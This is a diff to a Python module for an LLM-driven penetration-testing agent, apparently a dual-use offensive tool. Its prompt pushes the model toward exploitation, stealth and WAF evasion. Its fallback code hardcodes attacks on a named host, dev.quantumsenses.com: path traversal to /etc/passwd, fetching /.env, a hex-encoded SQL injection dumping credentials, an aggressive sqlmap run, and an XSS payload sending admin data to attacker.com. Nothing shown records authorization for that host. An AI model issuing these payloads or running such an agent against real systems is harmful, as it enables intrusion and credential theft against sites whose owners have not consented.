@@ -3,124 +3,112 @@ from typing import Dict, List, Any, Optional, Union
 from tools.llms import LLM
 
 ACTIONER_SYSTEM_PROMPT = """
-You are an elite security testing agent specializing in Advanced Persistent Threat (APT) simulation and Dynamic Application Security Testing (DAST). You have access to specific tools and must use them to actively test websites for security vulnerabilities with strategic business context awareness.
+You are an elite security testing agent with access to specialized security tools and browser automation. Execute comprehensive security assessments using progressive testing methodology.
 
-## Enhanced Security Testing Framework
-You will receive comprehensive test plans with strategic business intelligence including:
-- **Business Impact**: Financial risk assessment and regulatory compliance implications
-- **Attack Complexity**: Required skill level and sophisticated techniques needed
-- **Compliance Risk**: Specific regulatory standards and frameworks affected
+## Progressive Testing Phases:
+**Phase 1: Reconnaissance** - Map attack surface with api_endpoint_discovery() and navigate with goto()
+**Phase 2: Automated Detection** - Deploy specialized tools (sql_injection_test, xss_test, information_disclosure_test)  
+**Phase 3: Manual Validation** - Use browser automation (fill, submit, execute_js) to validate findings
+**Phase 4: Deep Exploitation** - Execute comprehensive campaigns (sqlmap_campaign, business_logic_test)
 
-## Strategic Testing Prioritization
-Adjust your testing approach based on business impact levels:
-- **CRITICAL/CATASTROPHIC**: Focus on advanced persistent threat techniques, financial system compromise, and regulatory compliance violations
-- **HIGH**: Implement sophisticated exploitation chains and enterprise-level attack simulation
+## Strategic Prioritization:
+- **CRITICAL/CATASTROPHIC**: Advanced persistent threat techniques, financial system compromise
+- **HIGH**: Sophisticated exploitation chains, enterprise-level attack simulation
 - **MEDIUM**: Standard penetration testing with business logic focus
-- **LOW**: Configuration and best practice validation
-
-## Attack Complexity Awareness
-Tailor your testing techniques based on complexity requirements:
-- **EXPERT/VERY HIGH**: Use advanced evasion techniques, sophisticated payload crafting, and multi-vector attack chains
-- **HIGH**: Implement business logic exploitation and advanced authorization bypass techniques
-- **MEDIUM-HIGH**: Use standard injection techniques with WAF bypass methods
-- **MEDIUM**: Apply conventional penetration testing methodologies
-- **LOW-MEDIUM**: Focus on reconnaissance and basic vulnerability identification
+- **LOW**: Configuration validation and security best practices
 
 ALWAYS format your response using EXACTLY this structure:
 
 * DISCUSSION
 [Your strategic analysis incorporating business impact, attack complexity, and compliance considerations. 
-Reference specific plan details including business_impact, attack_complexity, and compliance_risk when available. Explain your testing approach and expected outcomes.]
+Explain your testing approach, expected outcomes, and how this action fits into the progressive testing methodology.
+Be specific about which phase you're in and what intelligence you're building or validating.]
 
 * ACTION
 [Exactly ONE tool command with proper syntax and all required parameters]
 
-VALID TOOL COMMANDS - USE THESE EXACT FORMATS:
-- goto(page, "https://example.com") - Navigate to a URL
-- click(page, "a.nav-link") - Click an element using CSS selector
-- fill(page, "#input-field", "test value") - Fill a form field with value
-- submit(page, "form#login") - Submit a form
-- execute_js(page, "() => { return document.cookie }") - Execute JavaScript code
-- auth_needed() - Signal that authentication is required
-- refresh(page) - Refresh the current page
-- complete() - Mark the current test plan as complete
-- python_interpreter("print('test')") - Execute Python code
-- get_user_input("Enter value:") - Request user input
-- presskey(page, "Enter") - Press a keyboard key
+## COMPREHENSIVE TOOL ARSENAL
 
-CRITICAL RULES:
-1. ALWAYS include the 'page' parameter as the FIRST parameter for all page interactions
-2. NEVER use natural language in the ACTION section - only use valid tool commands
-3. NEVER try to combine multiple actions - use only ONE command per response
-4. ALWAYS use properly formatted and balanced quotes in selectors
-5. Do not include explanations or notes in the ACTION section
-6. You must perform at least 3 meaningful security testing actions before using complete()
-7. Reference plan's business_impact and attack_complexity in your discussion when available
+### SPECIALIZED SECURITY TESTING TOOLS:
+- **api_endpoint_discovery** - Map API attack surface and identify technology stack
+- **sql_injection_test** - Test for SQL injection vulnerabilities with advanced payloads
+- **sqlmap_campaign** - Deep SQL injection exploitation and database enumeration
+- **xss_test** - Cross-site scripting testing with context-aware payloads
+- **information_disclosure_test** - Sensitive information exposure and file discovery
+- **business_logic_data_validation_test** - Business logic vulnerability testing
+- **workflow_circumvention_test** - Workflow bypass and step-skipping vulnerabilities
+- **jwt_vulnerability_test** - JWT security analysis and token manipulation
+- **idor_test** - Insecure Direct Object Reference testing
+- **nmap_scan** - Network reconnaissance and service discovery
+- **enterprise_port_scan** - Advanced port scanning with service detection
 
-CRITICAL URL FORMATTING:
-- NEVER use plain text like "documentation" for URLs
-- ALWAYS use proper URL paths starting with "/" like "/docs/"
-- Documentation pages should be referenced as "/docs/" not as "documentation"
+### BROWSER AUTOMATION TOOLS:
+- **goto** - Navigate to URLs for interactive testing
+- **click** - Click elements for workflow testing
+- **fill** - Deliver payloads through form fields
+- **submit** - Submit forms to test validation and processing
+- **execute_js** - Execute JavaScript for client-side testing and analysis
+- **extract_forms** - Analyze form structure and security controls
+- **extract_links** - Map application navigation and endpoints
+- **get_cookies** - Extract session tokens for security analysis
+- **set_cookies** - Manipulate sessions for authentication testing
+- **screenshot** - Capture evidence of successful exploitation
+- **wait_for_element** - Wait for dynamic content during testing
+- **intercept_requests** - Monitor network traffic for security issues
+- **bypass_waf** - Configure headers for WAF evasion testing
 
-EXAMPLES OF CORRECT URL NAVIGATION:
-✅ goto(page, "/docs/")
-✅ goto(page, "/api/v1/users")
-✅ goto(page, "https://example.com/docs") 
 
-EXAMPLES OF INCORRECT URL NAVIGATION:
-❌ goto(page, "documentation")
-❌ goto(page, "docs page")
-❌ goto("documentation")
+### UTILITY TOOLS:
+- **auth_needed** - Signal authentication requirement
+- **complete** - Mark completion (requires minimum 5 actions)
+- **python_interpreter** - Execute Python code for custom analysis
 
-## Advanced Security Testing Methodologies
+## TESTING PATTERNS:
 
-**CRITICAL/CATASTROPHIC Business Impact Testing:**
-- SQL Injection with business logic bypass: "admin' UNION SELECT balance, account_id FROM accounts WHERE '1'='1"
-- Advanced XSS with session hijacking: "<script>fetch('/api/transfer',{method:'POST',body:'amount=10000&to=attacker'})</script>"
-- JWT manipulation for privilege escalation: Algorithm confusion attacks (HS256 to RS256)
-- Financial transaction manipulation through race conditions
-- Advanced persistent threat simulation with stealth techniques
+### SQL Injection Testing Pattern:
+1. **api_endpoint_discovery** - Map authentication endpoints
+2. **goto** - Navigate to target
+3. **extract_forms** - Analyze form structure
+4. **sql_injection_test** - Automated vulnerability detection
+5. **fill** - Manual payload delivery
+6. **submit** - Execute attack
+7. **execute_js** - Validate exploitation
+8. **sqlmap_campaign** - Deep exploitation if successful
 
-**HIGH Business Impact Testing:**
-- OAuth 2.0/SAML flow manipulation and federation bypass
-- Business logic workflow exploitation and approval process bypass
-- Advanced authorization testing with RBAC circumvention
-- API security assessment with microservices exploitation
-- Session management exploitation with concurrent abuse
+### XSS Testing Pattern:
+1. **goto** - Navigate to input points
+2. **xss_test** - Automated XSS detection
+3. **fill** - Manual payload delivery
+4. **submit** - Execute XSS
+5. **execute_js** - Confirm script execution
 
-**STANDARD Security Testing Focus:**
-- SQL Injection: Test forms with payloads like "admin' OR '1'='1", "'; DROP TABLE users; --"
-- XSS: Test inputs with "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"
-- Authentication Bypass: Test login forms with various bypass techniques
-- Authorization: Test access to admin panels, API endpoints with different privileges
-- Information Disclosure: Look for error messages, debug info, sensitive data exposure
-- Session Management: Test session tokens, cookies, CSRF protection
-- File Upload: Test malicious file uploads if upload functionality exists
-- Directory Traversal: Test for "../" path traversal vulnerabilities
+### Information Disclosure Pattern:
+1. **information_disclosure_test** - Systematic file discovery
+2. **goto** - Test direct file access
+3. **goto** - Check debug endpoints
+4. **execute_js** - Analyze source code
+5. **api_endpoint_discovery** - Map additional endpoints
 
-**Enterprise Compliance Testing:**
-- PCI DSS: Focus on payment processing security and cardholder data protection
-- GDPR: Test data privacy controls and consent mechanisms
-- SOX: Validate financial reporting controls and audit trail integrity
-- HIPAA: Assess health information protection and access controls
-- ISO 27001: Evaluate information security management controls
 
-JAVASCRIPT EXECUTION EXAMPLES:
-✅ execute_js(page, "() => { return document.title }")
-✅ execute_js(page, "() => { return document.cookie }")
-✅ execute_js(page, "() => { return localStorage.getItem('token') }")
-✅ execute_js(page, "() => { return document.querySelector('input[name=\"csrf\"]').value }")
-✅ execute_js(page, "() => { fetch('/api/admin/users').then(r=>r.text()).then(console.log) }")
 
-INCORRECT (WILL CAUSE ERRORS):
-* ACTION
-Let's navigate to the documentation page
+## CRITICAL EXECUTION RULES:
+1. **Progressive Intelligence**: Each action must build on previous findings
+2. **Tool Integration**: Combine specialized tools with browser automation for validation
+3. **Context Awareness**: Use intelligence from reconnaissance to guide tool selection
+4. **Evidence Collection**: Capture proof of successful exploitation
+5. **Business Impact**: Always relate findings to business consequences
+6. **Minimum Actions**: Perform at least 5 meaningful security actions before complete()
+7. **Strategic Focus**: Focus on WHAT tool to use and WHY, not HOW to format parameters
 
-CORRECT:
-* ACTION
-goto(page, "/docs/")
+## TOOL SELECTION INTELLIGENCE:
+Choose tools based on plan analysis:
+- **Authentication/Login keywords** → sql_injection_test + browser validation
+- **Information Disclosure keywords** → information_disclosure_test + directory traversal
+- **XSS/Headers keywords** → xss_test + manual payload delivery
+- **Business Logic keywords** → business_logic_data_validation_test + workflow testing
+- **API keywords** → api_endpoint_discovery + endpoint analysis
 
-Remember: Each response must contain exactly ONE tool command in the ACTION section. Always reference the plan's strategic context (business_impact, attack_complexity, compliance_risk) in your discussion to demonstrate elite-level security assessment capabilities.
+Remember: You are conducting sophisticated, real-world attack simulation that combines automated detection with manual validation to provide actionable security intelligence. Each action should demonstrate progression toward comprehensive vulnerability assessment and exploitation validation.
 """
 
 
@@ -138,7 +126,7 @@ class ActionerAgent:
                  reasoning_config: Optional[Dict] = None):
         self.llm = LLM(desc="gemini-2.0-flash for security testing execution")
         self.actions_performed = 0
-        self.min_actions_required = 3
+        self.min_actions_required = 5
         
         # LLM configuration
         self.api_type = api_type  # "gemini" or "fireworks"
@@ -152,12 +140,12 @@ class ActionerAgent:
         
     def generate_action_of_plan_step(self, 
                          plan: Dict[str, str], 
-                         page_data: str = "", 
+                         summarized_page_data: str = "", 
                          tool_output: str = "",
                          conversation_history: Optional[List[str]] = None) -> Dict[str, str]:
         try:
             # Build the prompt for the LLM using passed conversation history
-            prompt = self._build_execution_prompt(plan, page_data, tool_output, conversation_history)
+            prompt = self._build_execution_prompt(plan, summarized_page_data, tool_output, conversation_history)
             
             # Call LLM to get the response
             llm_response = self._call_llm(prompt)
@@ -174,7 +162,7 @@ class ActionerAgent:
             print(f"Error in plan execution: {str(e)}")
             return self._get_fallback_action(plan)
     
-    def _build_execution_prompt(self, plan: Dict[str, str], page_data: str, tool_output: str, conversation_history: Optional[List[str]] = None) -> Union[str, Dict[str, str]]:
+    def _build_execution_prompt(self, plan: Dict[str, str], summarized_page_data: str, tool_output: str, conversation_history: Optional[List[str]] = None) -> Union[str, Dict[str, str]]:
         # Extract plan details with enhanced fields
         plan_title = plan.get('title', 'Security Test')
         plan_description = plan.get('description', 'Perform security testing')
@@ -188,13 +176,14 @@ class ActionerAgent:
         Title: {plan_title}
         Description: {plan_description}"""
         
-        # Add enhanced fields if available
+        # Add enhanced fields to plan section if available
         if business_impact:
             plan_section += f"\nBusiness Impact: {business_impact}"
         if attack_complexity:
             plan_section += f"\nAttack Complexity: {attack_complexity}"
         if compliance_risk:
             plan_section += f"\nCompliance Risk: {compliance_risk}"
+
         
         # Build conversation context from passed history
         context_section = ""
@@ -206,8 +195,8 @@ class ActionerAgent:
         
         # Build page data section
         page_section = ""
-        if page_data:
-            page_section = f"\n\nCURRENT PAGE DATA:\n{page_data[:2000]}..."  # Limit to 2000 chars
+        if summarized_page_data:
+            page_section = f"\n\nCURRENT PAGE DATA:\n{summarized_page_data[:2000]}..."  # Limit to 2000 chars
         
         # Build tool output section
         tool_section = ""
@@ -219,15 +208,13 @@ class ActionerAgent:
         if self.actions_performed < self.min_actions_required:
             actions_section += f" (Need at least {self.min_actions_required} actions before completion)"
         
-        # Add strategic testing guidance based on plan context
-        strategic_guidance = self._get_strategic_guidance(business_impact, attack_complexity, compliance_risk)
+        
         
         # Construct the base prompt
         base_prompt = f"""
             {ACTIONER_SYSTEM_PROMPT}
 
             {plan_section}
-            {strategic_guidance}
             {context_section}
             {page_section}
             {tool_section}
@@ -235,7 +222,7 @@ class ActionerAgent:
 
             Based on the enhanced test plan with strategic business context, provide your next security testing action.
             Remember to reference the business impact, attack complexity, and compliance risk in your discussion.
-            Follow the exact format with * DISCUSSION and * ACTION sections.
+            Follow the exact format with *DISCUSSION and *ACTION sections.
         """
         
         # Return the appropriate prompt format based on api_type
@@ -245,7 +232,6 @@ class ActionerAgent:
                 "system_prompt": ACTIONER_SYSTEM_PROMPT,
                 "user_prompt": f"""
                     {plan_section}
-                    {strategic_guidance}
                     {context_section}
                     {page_section}
                     {tool_section}
@@ -367,39 +353,43 @@ class ActionerAgent:
             }
     
     def _extract_tool_command_fallback(self, response: str) -> str:        
-        # List of valid tool commands
+        # Accept browser-action commands but return them without the legacy 'page' argument
         valid_commands = [
-            'goto', 'click', 'fill', 'submit', 'execute_js', 
-            'auth_needed', 'refresh', 'complete', 'python_interpreter', 
+            'goto', 'click', 'fill', 'submit', 'execute_js',
+            'auth_needed', 'refresh', 'complete', 'python_interpreter',
             'get_user_input', 'presskey'
         ]
         
         # Try to find any valid tool command
         for command in valid_commands:
+            # allow for optional leading "page, " inside the parentheses
             pattern = rf'{command}\s*\([^)]*\)'
             match = re.search(pattern, response, re.IGNORECASE)
             if match:
-                return match.group(0)
+                extracted = match.group(0)
+                # Strip 'page,' if present
+                extracted = re.sub(r'\(\s*page\s*,', '(', extracted)
+                return extracted
         
         # If no tool command found, return a safe default
-        return 'goto(page, "/docs/")'
+        return 'goto("/docs/")'
     
     def _validate_action(self, response: Dict[str, str]) -> Dict[str, str]:        
         action = response.get('action', '').strip()
         
-        # List of valid tool commands with their expected patterns
+        # Updated patterns that no longer include the legacy 'page' placeholder
         valid_patterns = {
-            'goto': r'goto\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*\)',
-            'click': r'click\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*\)',
-            'fill': r'fill\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*,\s*["\'][^"\']*["\']\s*\)',
-            'submit': r'submit\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*\)',
-            'execute_js': r'execute_js\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*\)',
+            'goto': r'goto\s*\(\s*["\'][^"\']*["\']\s*\)',
+            'click': r'click\s*\(\s*["\'][^"\']*["\']*\s*\)',
+            'fill': r'fill\s*\(\s*["\'][^"\']*["\']*\s*,\s*["\'][^"\']*["\']*\s*\)',
+            'submit': r'submit\s*\(\s*["\'][^"\']*["\']*\s*\)',
+            'execute_js': r'execute_js\s*\(\s*["\'][^"\']*["\']*\s*\)',
             'auth_needed': r'auth_needed\s*\(\s*\)',
-            'refresh': r'refresh\s*\(\s*page\s*\)',
+            'refresh': r'refresh\s*\(\s*\)',
             'complete': r'complete\s*\(\s*\)',
-            'python_interpreter': r'python_interpreter\s*\(\s*["\'][^"\']*["\']\s*\)',
-            'get_user_input': r'get_user_input\s*\(\s*["\'][^"\']*["\']\s*\)',
-            'presskey': r'presskey\s*\(\s*page\s*,\s*["\'][^"\']*["\']\s*\)'
+            'python_interpreter': r'python_interpreter\s*\(\s*["\'][^"\']*["\']*\s*\)',
+            'get_user_input': r'get_user_input\s*\(\s*["\'][^"\']*["\']*\s*\)',
+            'presskey': r'presskey\s*\(\s*["\'][^"\']*["\']*\s*\)'
         }
         
         # Check if action matches any valid pattern
@@ -419,7 +409,7 @@ class ActionerAgent:
         
         # Ensure we don't complete too early
         if action.startswith('complete') and self.actions_performed < self.min_actions_required:
-            action = 'goto(page, "/docs/")'  # Force more testing
+            action = 'goto("/docs/")'  # Force more testing
             response['discussion'] += f" (Need {self.min_actions_required - self.actions_performed} more actions before completion)"
         
         response['action'] = action
@@ -429,12 +419,8 @@ class ActionerAgent:
         # Remove any extra text after the command
         action = re.sub(r'\).*$', ')', action)
         
-        # Fix missing page parameter for page-interactive commands
-        page_commands = ['goto', 'click', 'fill', 'submit', 'execute_js', 'refresh', 'presskey']
-        for cmd in page_commands:
-            if action.startswith(cmd) and 'page' not in action:
-                # Insert page parameter
-                action = re.sub(rf'^{cmd}\s*\(', f'{cmd}(page, ', action)
+        # Strip the legacy 'page' argument if it is still present (for backward compatibility)
+        action = re.sub(r'\(\s*page\s*,', '(', action)
         
         # Fix unbalanced quotes
         if action.count('"') % 2 != 0:
@@ -448,7 +434,7 @@ class ActionerAgent:
         
         # If still invalid, return a safe default
         if not any(cmd in action for cmd in ['goto', 'click', 'fill', 'submit', 'execute_js', 'auth_needed', 'refresh', 'complete']):
-            return 'goto(page, "/docs/")'
+            return 'goto("/docs/")'
         
         return action
     
@@ -462,46 +448,106 @@ class ActionerAgent:
         # Combine all plan text for analysis
         plan_text = f"{plan_title} {plan_description} {business_impact} {attack_complexity} {compliance_risk}"
         
-        # Enhanced fallback logic based on plan context
-        if any(term in plan_text for term in ['critical', 'catastrophic', 'financial', 'payment', 'transaction']):
-            action = 'goto(page, "/api/v1/transactions")'
-            discussion = f"Starting CRITICAL business impact assessment by examining financial transaction APIs. Plan indicates {plan.get('business_impact', 'high-risk financial impact')} requiring sophisticated testing approach."
+        # Progressive testing approach based on action count and plan context
+        if self.actions_performed == 0:
+            # Phase 1: Always start with reconnaissance regardless of plan type
+            if any(term in plan_text for term in ['sql', 'injection', 'login', 'authentication', 'credential']):
+                action = 'api_endpoint_discovery("https://dev.quantumsenses.com", discovery_mode="comprehensive", target_context={"framework": "unknown", "has_waf": False, "authentication_type": "unknown"})'
+                discussion = f"Phase 1: Reconnaissance & Target Profiling - Initiating comprehensive credential injection assessment with API endpoint discovery to map authentication infrastructure and identify technology stack. Business Impact: {plan.get('business_impact', 'authentication compromise')}. This intelligence will guide our advanced evasion strategies."
+            
+            elif any(term in plan_text for term in ['information', 'disclosure', 'config', 'dev', 'debug']):
+                action = 'information_disclosure_test("https://dev.quantumsenses.com", target_context={"framework": "unknown", "web_server": "unknown", "language": "unknown", "environment": "development"})'
+                discussion = f"Phase 1: Reconnaissance & Target Profiling - Executing systematic information disclosure assessment targeting development environment exposure. Attack Complexity: {plan.get('attack_complexity', 'standard')}. Conducting comprehensive testing for configuration files and debug endpoints."
+            
+            elif any(term in plan_text for term in ['xss', 'headers', 'security', 'client-side', 'script']):
+                action = 'goto("/")'
+                discussion = f"Phase 1: Reconnaissance & Target Profiling - Starting security headers analysis and client-side attack surface assessment. Business Impact: {plan.get('business_impact', 'client-side compromise')}. First analyzing application structure and security controls."
+            
+            else:
+                action = 'api_endpoint_discovery("https://dev.quantumsenses.com", discovery_mode="comprehensive", target_context={})'
+                discussion = f"Phase 1: Reconnaissance & Target Profiling - Conducting comprehensive API endpoint discovery to map attack surface and identify technology stack. This foundational intelligence will inform subsequent testing phases."
         
-        elif any(term in plan_text for term in ['sql', 'injection', 'login', 'authentication']):
-            action = 'goto(page, "/login/")'
-            discussion = f"Initiating authentication security assessment. Attack complexity: {plan.get('attack_complexity', 'standard')}. Focusing on SQL injection and authentication bypass techniques."
+        elif self.actions_performed == 1:
+            # Phase 2: Context building or automated detection
+            if any(term in plan_text for term in ['sql', 'injection', 'login', 'authentication']):
+                action = 'goto("/auth/login")'
+                discussion = f"Phase 2: Interactive Analysis - Target profiled, now navigating to authentication endpoint for detailed form structure analysis. Need to examine client-side validation, hidden fields, and security controls that could impact injection strategy."
+            
+            elif any(term in plan_text for term in ['information', 'disclosure']):
+                action = 'goto("/dev/../../../etc/passwd")'
+                discussion = f"Phase 2: Manual Validation - Initial disclosure scan completed, now testing directory traversal attacks against development paths to access sensitive files beyond web root."
+            
+            elif any(term in plan_text for term in ['xss', 'headers']):
+                action = 'execute_js("() => { const meta = Array.from(document.querySelectorAll(\'meta\')).map(m => ({name: m.name || m.httpEquiv, content: m.content})); return { metaTags: meta, securityHeaders: { csp: document.querySelector(\'meta[http-equiv=\"Content-Security-Policy\"]\')?.content || \'MISSING\' } }; }")'
+                discussion = f"Phase 2: Security Control Analysis - Analyzing HTTP response headers and meta tags for missing security controls. This analysis will guide our client-side attack strategy."
+            
+            else:
+                action = 'goto("/")'
+                discussion = f"Phase 2: Interactive Analysis - API discovery completed, now navigating to application for interactive analysis and security control examination."
         
-        elif any(term in plan_text for term in ['xss', 'cross-site', 'script', 'input', 'validation']):
-            action = 'goto(page, "/search/")'
-            discussion = f"Beginning input validation testing for XSS vulnerabilities. Business impact: {plan.get('business_impact', 'data compromise risk')}. Implementing systematic payload testing approach."
+        elif self.actions_performed == 2:
+            # Phase 2/3: Automated testing or form analysis
+            if any(term in plan_text for term in ['sql', 'injection', 'authentication']):
+                action = 'extract_forms()'
+                discussion = f"Phase 2: Form Structure Analysis - Authentication endpoint accessed, extracting complete form structure to understand input validation mechanisms and identify injection points for advanced payload crafting."
+            
+            elif any(term in plan_text for term in ['information', 'disclosure']):
+                action = 'goto("/.env")'
+                discussion = f"Phase 2: Configuration File Testing - Directory traversal tested, now checking direct access to common development configuration files that often contain critical system secrets."
+            
+            elif any(term in plan_text for term in ['xss', 'headers']):
+                action = 'xss_test("https://dev.quantumsenses.com/search", parameter="q", target_context={"framework": "unknown", "has_waf": False}, test_mode="advanced")'
+                discussion = f"Phase 2: Automated XSS Detection - Security header analysis complete, executing comprehensive XSS testing campaign leveraging absent security controls for maximum attack effectiveness."
+            
+            else:
+                action = 'extract_forms()'
+                discussion = f"Phase 2: Form Analysis - Extracting form structures for security testing and vulnerability identification."
         
-        elif any(term in plan_text for term in ['api', 'authorization', 'idor', 'privilege', 'escalation']):
-            action = 'goto(page, "/api/")'
-            discussion = f"Commencing API authorization testing. Attack complexity: {plan.get('attack_complexity', 'medium-high')}. Focusing on privilege escalation and IDOR vulnerabilities."
+        elif self.actions_performed == 3:
+            # Phase 3: Automated vulnerability detection
+            if any(term in plan_text for term in ['sql', 'injection', 'authentication']):
+                action = 'sql_injection_test("https://dev.quantumsenses.com/auth/login", parameter="encryptedData", target_context={"framework": "unknown", "database": "unknown", "has_waf": False, "supports_post": True})'
+                discussion = f"Phase 3: Automated Vulnerability Detection - Form structure analyzed, executing comprehensive SQL injection campaign with advanced evasion techniques targeting the encryptedData parameter."
+            
+            elif any(term in plan_text for term in ['information', 'disclosure']):
+                action = 'goto("/debug/info")'
+                discussion = f"Phase 3: Debug Endpoint Analysis - Configuration file access tested, now extracting debug information and stack traces that reveal internal system architecture."
+            
+            elif any(term in plan_text for term in ['xss', 'headers']):
+                action = 'fill(page, "#search", "<script>fetch(\'/admin/users\', {credentials: \'include\'}).then(r=>r.text()).then(d=>fetch(\'http://attacker.com/?data=\'+btoa(d)))</script>")'
+                discussion = f"Phase 3: Manual XSS Validation - Automated XSS testing completed, delivering advanced payload with data exfiltration capabilities leveraging missing CSP protection."
+            
+            else:
+                action = 'sql_injection_test("https://dev.quantumsenses.com", parameter="id", target_context={})'
+                discussion = f"Phase 3: Automated Detection - Conducting SQL injection testing for vulnerability identification."
         
-        elif any(term in plan_text for term in ['admin', 'administrative', 'access control', 'rbac']):
-            action = 'goto(page, "/admin/")'
-            discussion = f"Accessing administrative interfaces for access control testing. Compliance risk: {plan.get('compliance_risk', 'access control violations')}. Testing role-based access control mechanisms."
-        
-        elif any(term in plan_text for term in ['session', 'token', 'jwt', 'oauth', 'saml']):
-            action = 'goto(page, "/dashboard/")'
-            discussion = f"Initiating session management security assessment. Attack complexity: {plan.get('attack_complexity', 'high')}. Focusing on token manipulation and session hijacking techniques."
-        
-        elif any(term in plan_text for term in ['information', 'disclosure', 'reconnaissance', 'intelligence']):
-            action = 'goto(page, "/docs/")'
-            discussion = f"Beginning information disclosure assessment. Business impact: {plan.get('business_impact', 'competitive intelligence exposure')}. Systematic reconnaissance of exposed information."
-        
-        elif any(term in plan_text for term in ['cloud', 'infrastructure', 'devops', 'container']):
-            action = 'goto(page, "/api/health/")'
-            discussion = f"Starting infrastructure security assessment. Compliance risk: {plan.get('compliance_risk', 'infrastructure controls')}. Testing cloud and DevOps security posture."
-        
-        elif any(term in plan_text for term in ['pci dss', 'gdpr', 'sox', 'hipaa', 'iso 27001']):
-            action = 'goto(page, "/api/v1/users")'
-            discussion = f"Initiating compliance-focused testing. Compliance risk: {plan.get('compliance_risk', 'regulatory violations')}. Validating regulatory security controls."
+        elif self.actions_performed == 4:
+            # Phase 3: Manual validation
+            if any(term in plan_text for term in ['sql', 'injection']):
+                action = 'fill(page, "input[name=\'encryptedData\']", "\\\\x61\\\\x64\\\\x6d\\\\x69\\\\x6e\\\\x27\\\\x20\\\\x55\\\\x4e\\\\x49\\\\x4f\\\\x4e\\\\x20\\\\x53\\\\x45\\\\x4c\\\\x45\\\\x43\\\\x54\\\\x20\\\\x31\\\\x2c\\\\x75\\\\x73\\\\x65\\\\x72\\\\x6e\\\\x61\\\\x6d\\\\x65\\\\x2c\\\\x70\\\\x61\\\\x73\\\\x73\\\\x77\\\\x6f\\\\x72\\\\x64\\\\x20\\\\x46\\\\x52\\\\x4f\\\\x4d\\\\x20\\\\x75\\\\x73\\\\x65\\\\x72\\\\x73\\\\x2d\\\\x2d")'
+                discussion = f"Phase 3: Manual Payload Validation - SQL injection confirmed, delivering advanced hex-encoded evasion payload to test authentication bypass and credential extraction capabilities."
+            
+            elif any(term in plan_text for term in ['xss', 'headers']):
+                action = 'submit(page, "form")'
+                discussion = f"Phase 3: XSS Execution - Advanced payload delivered, submitting form to test script execution and validate missing security header exploitation."
+            
+            else:
+                action = 'fill(page, "input[type=\'text\']", "test_payload")'
+                discussion = f"Phase 3: Manual Testing - Delivering test payload for manual validation of identified vulnerabilities."
         
         else:
-            action = 'goto(page, "/docs/")'
-            discussion = f"Starting comprehensive security assessment. Business impact: {plan.get('business_impact', 'standard risk assessment')}. Beginning with application documentation review."
+            # Phase 4: Deep exploitation or completion
+            if any(term in plan_text for term in ['sql', 'injection']):
+                action = 'sqlmap_campaign("https://dev.quantumsenses.com/auth/login", options={"data": "encryptedData=test", "technique": "BEU", "level": 5, "risk": 3}, campaign_mode="comprehensive")'
+                discussion = f"Phase 4: Deep Exploitation - Manual authentication bypass validated, escalating to comprehensive SQLMap campaign for complete database enumeration and infrastructure mapping."
+            
+            elif any(term in plan_text for term in ['information', 'disclosure']):
+                action = 'business_logic_data_validation_test("https://dev.quantumsenses.com/admin/config", parameters=["config_key", "config_value"], target_context={"framework": "unknown", "supports_json": True}, test_mode="comprehensive")'
+                discussion = f"Phase 4: Business Logic Assessment - Information disclosure confirmed, testing business logic vulnerabilities to amplify impact through data validation bypass."
+            
+            else:
+                action = 'complete()'
+                discussion = f"Phase 4: Assessment Complete - Comprehensive security testing completed across multiple attack vectors. {self.actions_performed} security actions performed with progressive intelligence building and exploitation validation."
         
         return {
             'discussion': discussion,
@@ -537,110 +583,4 @@ class ActionerAgent:
             'reasoning_config': self.reasoning_config
         }
 
-    def _get_strategic_guidance(self, business_impact: str, attack_complexity: str, compliance_risk: str) -> str:
-        """Generate strategic testing guidance based on plan context."""
-        guidance_sections = []
-        
-        # Business Impact Guidance
-        if business_impact:
-            impact_level = ""
-            if any(term in business_impact.upper() for term in ['CRITICAL', 'CATASTROPHIC']):
-                impact_level = "CRITICAL/CATASTROPHIC"
-                guidance_sections.append("""
-STRATEGIC PRIORITY: CRITICAL/CATASTROPHIC Business Impact
-- Focus on financial system compromise and data breach vectors
-- Implement advanced persistent threat simulation techniques
-- Test for regulatory compliance violations (PCI DSS, GDPR, SOX)
-- Use sophisticated evasion and stealth techniques
-- Prioritize payment processing and sensitive data access testing""")
-            
-            elif 'HIGH' in business_impact.upper():
-                impact_level = "HIGH"
-                guidance_sections.append("""
-STRATEGIC PRIORITY: HIGH Business Impact
-- Implement enterprise-level attack simulation
-- Focus on business continuity threats and administrative access
-- Test advanced authorization and session management
-- Assess supply chain and third-party integration security
-- Evaluate competitive intelligence exposure risks""")
-            
-            elif 'MEDIUM' in business_impact.upper():
-                impact_level = "MEDIUM"
-                guidance_sections.append("""
-STRATEGIC PRIORITY: MEDIUM Business Impact
-- Standard penetration testing with business logic focus
-- Test for information disclosure and operational disruption
-- Assess internal user compromise vectors
-- Validate security best practices implementation""")
-            
-            elif 'LOW' in business_impact.upper():
-                impact_level = "LOW"
-                guidance_sections.append("""
-STRATEGIC PRIORITY: LOW Business Impact
-- Configuration validation and security best practice review
-- Focus on technical debt and missing security headers
-- Test for verbose error messages and information leakage""")
-        
-        # Attack Complexity Guidance
-        if attack_complexity:
-            complexity_guidance = ""
-            if any(term in attack_complexity.upper() for term in ['EXPERT', 'VERY HIGH']):
-                complexity_guidance = """
-ATTACK COMPLEXITY: EXPERT/VERY HIGH
-- Use advanced evasion techniques and sophisticated payloads
-- Implement multi-vector attack chains and timing attacks
-- Apply APT-level stealth and anti-forensics techniques
-- Craft custom exploits and zero-day simulation approaches"""
-            
-            elif 'HIGH' in attack_complexity.upper():
-                complexity_guidance = """
-ATTACK COMPLEXITY: HIGH
-- Implement business logic exploitation techniques
-- Use advanced authorization bypass and privilege escalation
-- Apply sophisticated session manipulation and CSRF techniques
-- Test complex business workflow vulnerabilities"""
-            
-            elif 'MEDIUM' in attack_complexity.upper():
-                complexity_guidance = """
-ATTACK COMPLEXITY: MEDIUM-HIGH
-- Use standard injection techniques with WAF bypass methods
-- Implement conventional authentication and session testing
-- Apply systematic input validation testing approaches"""
-            
-            elif 'LOW' in attack_complexity.upper():
-                complexity_guidance = """
-ATTACK COMPLEXITY: LOW-MEDIUM
-- Focus on reconnaissance and basic vulnerability identification
-- Use standard security scanning and validation techniques
-- Apply conventional penetration testing methodologies"""
-            
-            if complexity_guidance:
-                guidance_sections.append(complexity_guidance)
